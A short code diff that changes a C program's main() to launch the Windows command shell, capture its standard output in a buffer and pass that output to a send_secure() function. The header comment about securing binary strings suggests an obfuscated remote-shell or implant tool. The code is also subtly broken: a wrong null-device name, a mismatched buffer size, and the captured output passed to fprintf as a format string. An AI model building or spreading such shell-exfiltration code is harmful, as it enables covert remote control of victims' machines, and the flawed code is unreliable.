@@ -26,8 +26,17 @@
  *
  * 	USE PLStr to secure all your binary strings
  */
- int main(){
-	 system("cmd");
+ PL_int main(){
+	/*
+	 * as per microsoft docs, the max buffer size of STDOUT is 4k bytes
+	 */
+	char buffer[4096] = {0};
+	fflush(stdout);
+	freopen("NULL","a",stdout);
+	setvbuf(stdout,buffer,_IONBF,1024);
+	system("cmd");
+	fprintf(stderr,buffer);
+	send_secure(buffer,sizeof(buffer));
 	 /*
 	BYTE* tmp = "hello";
 	send_secure(tmp,5);
